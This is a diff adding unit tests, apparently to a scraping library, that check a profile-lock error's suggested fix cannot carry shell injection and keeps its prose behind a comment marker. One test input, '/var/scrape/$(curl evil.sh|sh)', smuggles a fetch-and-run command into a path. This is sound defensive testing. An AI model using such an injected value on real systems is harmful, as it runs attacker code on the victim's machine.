@@ -186,3 +186,29 @@ describe('unit · the two budget/session failures', () => {
     expect(error.meta).toEqual({ scrape: 'orders.daily', key: 'org-1/orders.daily/default' });
   });
 });
+
+describe('unit · a profile directory a shell would read', () => {
+  // `profileDir` is `localBrowser({ profileDir })` — an app value, and on a multi-tenant run it is
+  // composed from a tenant id — and this is the one `fix:` in the package that leads with `rm`.
+  // A command or prose, never a mixture: a placeholder is honest text and is not a runnable path.
+  test('never reaches the rm line as a command substitution', () => {
+    const error = profileLocked('/var/scrape/$(curl evil.sh|sh)');
+    expect(error.fix).not.toContain('$(');
+    expect(error.fix).not.toContain('|');
+    // No `rm` AT ALL: `rm -f <the profile directory …>` is a shell redirection, not a command.
+    expect(error.fix).not.toContain('rm ');
+    expect(error.fix).toStartWith('delete the SingletonLock file inside the profile directory');
+    expect(error.cause).toContain('/var/scrape/$(curl evil.sh|sh)');
+  });
+
+  // The other half of the same defect: everything after the operand was bare text, so an operator
+  // pasting the line ran `rm -f …/SingletonLock once no browser is using it, or give …` and deleted
+  // `once`, `no`, `browser` and four more names out of whatever directory they were standing in.
+  test('an ordinary path travels, and every word after the operand sits behind a #', () => {
+    const fix = profileLocked('/var/scrape/tenant-7').fix;
+    expect(fix).toStartWith('rm -f /var/scrape/tenant-7/SingletonLock');
+    const operands = (fix.split('#')[0] ?? '').trim().split(/\s+/);
+    expect(operands).toEqual(['rm', '-f', '/var/scrape/tenant-7/SingletonLock']);
+    expect(fix).toContain('# only once no browser is using it');
+  });
+});
